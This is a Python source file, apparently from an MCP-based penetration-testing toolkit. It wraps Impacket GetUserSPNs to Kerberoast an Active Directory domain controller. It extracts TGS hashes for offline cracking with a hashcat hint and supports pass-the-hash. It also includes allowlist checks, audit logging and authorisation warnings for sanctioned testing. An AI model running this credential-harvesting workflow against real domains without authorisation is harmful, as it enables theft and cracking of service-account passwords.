"""Impacket GetUserSPNs Kerberoasting tool wrapper.

WARNING: Kerberoasting is a high-risk Active Directory attack technique.
It requests Kerberos TGS tickets for service accounts and is detectable
by modern EDR, SIEM solutions, and Windows Event ID 4769.
Requires explicit written authorization from the target domain owner.
"""

from __future__ import annotations

import re
import shutil
import time

import structlog
from fastmcp import Context

from tengu.config import get_config
from tengu.executor.process import run_command
from tengu.executor.registry import resolve_tool_path
from tengu.security.allowlist import make_allowlist_from_config
from tengu.security.audit import get_audit_logger
from tengu.security.rate_limiter import rate_limited
from tengu.security.sanitizer import sanitize_domain, sanitize_free_text, sanitize_target

logger = structlog.get_logger(__name__)

# TGS ticket hash pattern (Kerberoast hashcat format)
_TGS_HASH_PATTERN = re.compile(r"\$krb5tgs\$\d+\$.*?\$.*?\$[a-fA-F0-9]+\$[a-fA-F0-9]+")

# SPN line pattern
_SPN_PATTERN = re.compile(r"ServicePrincipalName\s+(.+?)(?:\s{2,}|\t)")


async def impacket_kerberoast(
    ctx: Context,  # type: ignore[type-arg]
    target: str,
    domain: str,
    username: str,
    password: str = "",
    hashes: str = "",
    timeout: int | None = None,
) -> dict:  # type: ignore[type-arg]
    """Perform Kerberoasting using Impacket GetUserSPNs.

    Requests TGS tickets for service accounts with SPNs registered in Active Directory.
    The resulting hashes can be cracked offline with hashcat (-m 13100) or john.

    Args:
        target: Domain Controller IP address.
        domain: Active Directory domain name (e.g. corp.local).
        username: Valid domain username for authentication.
        password: Password for authentication (redacted in logs).
        hashes: NTLM hash for pass-the-hash (format: LM:NT). Alternative to password.
        timeout: Override default timeout.

    Returns:
        Kerberoastable service accounts, SPNs, and TGS hashes for offline cracking.

    WARNING:
        - Kerberoasting is detectable by modern EDR and SIEM solutions.
        - Requires valid domain credentials.
        - Target must be in tengu.toml [targets].allowed_hosts.
    """
    cfg = get_config()
    audit = get_audit_logger()

    target = sanitize_target(target)
    domain = sanitize_domain(domain)
    safe_username = sanitize_free_text(username, field="username", max_length=256)
    safe_password = (
        sanitize_free_text(password, field="password", max_length=512) if password else ""
    )
    safe_hashes = sanitize_free_text(hashes, field="hashes", max_length=128) if hashes else ""

    # Audit params — redact credentials
    params: dict[str, object] = {
        "target": target,
        "domain": domain,
        "username": safe_username,
        "password": "[REDACTED]" if safe_password else "",
        "hashes": "[REDACTED]" if safe_hashes else "",
    }

    # Allowlist check
    allowlist = make_allowlist_from_config()
    try:
        allowlist.check(target)
    except Exception as exc:
        await audit.log_target_blocked("impacket-GetUserSPNs", target, str(exc))
        raise

    # Resolve tool path — try GetUserSPNs.py first, then impacket-GetUserSPNs
    tool_name: str
    tool_path: str
    if shutil.which("GetUserSPNs.py"):
        tool_name = "GetUserSPNs.py"
        tool_path = resolve_tool_path("GetUserSPNs.py")
    else:
        tool_name = "impacket-GetUserSPNs"
        tool_path = resolve_tool_path("impacket-GetUserSPNs")

    effective_timeout = timeout or cfg.tools.defaults.scan_timeout

    # Build credential argument
    cred_arg = f"{domain}/{safe_username}"
    if safe_password:
        cred_arg = f"{domain}/{safe_username}:{safe_password}"

    args: list[str] = [
        tool_path,
        cred_arg,
        "-dc-ip",
        target,
        "-request",
        "-outputfile",
        "/dev/stdout",
    ]

    if safe_hashes:
        args.extend(["-hashes", safe_hashes])

    logger.warning(
        "Kerberoasting initiated — this operation is detectable by domain controllers (Event ID 4769)",
        target=target,
        domain=domain,
        username=safe_username,
    )

    await ctx.report_progress(0, 100, f"Starting Kerberoasting against {domain} DC {target}...")

    async with rate_limited("impacket"):
        start = time.monotonic()
        await audit.log_tool_call(tool_name, target, params, result="started")

        try:
            stdout, stderr, returncode = await run_command(args, timeout=effective_timeout)
        except Exception as exc:
            await audit.log_tool_call(tool_name, target, params, result="failed", error=str(exc))
            raise

        duration = time.monotonic() - start

    await ctx.report_progress(80, 100, "Parsing Kerberoasting results...")

    parsed = _parse_kerberoast_output(stdout)

    await ctx.report_progress(100, 100, "Kerberoasting complete")
    await audit.log_tool_call(
        tool_name, target, params, result="completed", duration_seconds=duration
    )

    hashcat_hint = (
        "Crack offline with: hashcat -m 13100 hashes.txt wordlist.txt"
        if parsed["tgs_hashes"]
        else ""
    )

    return {
        "tool": tool_name,
        "target": target,
        "domain": domain,
        "command": " ".join(args),
        "duration_seconds": round(duration, 2),
        "kerberoastable_accounts": len(parsed["accounts"]),
        "accounts": parsed["accounts"],
        "tgs_hashes": parsed["tgs_hashes"],
        "hashcat_mode": "13100 (Kerberos 5 TGS-REP etype 23)",
        "hashcat_hint": hashcat_hint,
        "warning": "Kerberoasting generates Windows Event ID 4769 on the Domain Controller.",
        "raw_output_excerpt": stdout[-4000:] if len(stdout) > 4000 else stdout,
    }


def _parse_kerberoast_output(output: str) -> dict:  # type: ignore[type-arg]
    """Parse Impacket GetUserSPNs output for TGS hashes and account information."""
    accounts: list[dict] = []  # type: ignore[type-arg]
    tgs_hashes: list[str] = []
    current_account: dict[str, object] = {}

    for line in output.splitlines():
        line = line.strip()
        if not line:
            continue

        # TGS hash line — starts with $krb5tgs$
        if line.startswith("$krb5tgs$") or _TGS_HASH_PATTERN.match(line):
            tgs_hashes.append(line)
            if current_account:
                current_account["tgs_hash"] = line
                accounts.append(current_account)
                current_account = {}
            continue

        # SPN line from the tabular output
        # Format: ServicePrincipalName  Name  MemberOf  PasswordLastSet  LastLogon  Delegation
        parts = re.split(r"\s{2,}|\t", line)
        if len(parts) >= 2:
            spn = parts[0].strip()
            account_name = parts[1].strip() if len(parts) > 1 else ""
            # Filter out header lines
            if spn and account_name and spn != "ServicePrincipalName" and spn != "-":
                current_account = {
                    "spn": spn,
                    "account": account_name,
                    "member_of": parts[2].strip() if len(parts) > 2 else "",
                    "password_last_set": parts[3].strip() if len(parts) > 3 else "",
                    "tgs_hash": None,
                }

    # Flush any trailing account without a TGS hash
    if current_account and current_account.get("spn"):
        accounts.append(current_account)

    # If hashes were found but accounts weren't parsed structurally, create minimal entries
    if tgs_hashes and not accounts:
        for i, h in enumerate(tgs_hashes):
            accounts.append(
                {
                    "spn": f"unknown-spn-{i + 1}",
                    "account": "unknown",
                    "tgs_hash": h,
                }
            )

    return {
        "accounts": accounts,
        "tgs_hashes": tgs_hashes,
    }
